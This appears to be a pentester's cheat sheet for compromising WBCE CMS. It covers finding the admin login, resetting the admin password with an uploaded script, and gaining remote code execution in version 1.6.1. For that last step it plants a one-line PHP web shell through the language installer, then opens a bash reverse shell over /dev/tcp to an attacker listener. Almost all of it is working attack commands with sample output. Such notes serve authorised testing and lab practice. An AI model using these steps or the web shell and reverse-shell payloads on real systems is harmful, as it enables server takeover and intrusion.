# WBCE CMS

## Identify WBCE CMS
# Login page found at:
```bash
http://<TARGET IP>/admin/login/index.php
```

## Reset Admin Password
```bash
# Download reset script from:
# https://github.com/WBCE/wbce_tools/tree/master/reset_admin_password
```
# Upload the script to the target web root then trigger it via curl:
```bash
curl http://<TARGET IP>/reset_admin_pass.php
# Example Result:
# Successfully reset default Admin Password to 'reset123'
# What to do next? Log in with:
# admin:reset123
```

## RCE via Language File Upload (WBCE CMS 1.6.1)
```bash
# Reference: https://github.com/capture0x/WBCE_CMS
# Step 1: Log in with admin credentials
# Step 2: Navigate to Add-ons -> Language -> Install Language
http://<TARGET IP>/admin/languages/index.php
```
# Step 3: Create a malicious upgrade.php file
```bash
echo '<?php echo system($_GET["cmd"]); ?>' > upgrade.php
```
# Step 4: Upload upgrade.php and click Install
```bash
http://<TARGET IP>/admin/languages/install.php
```

# Step 5: Execute commands
```bash
http://<TARGET IP>/upgrade.php?cmd=id
# Example Result:
# uid=1000(soft) gid=1000(soft) groups=1000(soft)

# What to do next? Start listener on Kali then execute reverse shell via URL:
nc -nvlp 4444

# Execute reverse shell via browser or curl:
http://<TARGET IP>/upgrade.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/192.168.45.227/4444+0>%261'

# Or via curl:
curl "http://<TARGET IP>/upgrade.php?cmd=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/192.168.45.227/4444%200>%261'"

# Example Result on listener:
# connect to [192.168.45.227] from (UNKNOWN) [192.168.x.x]
# bash: no job control in this shell
# www-data@target:/$
```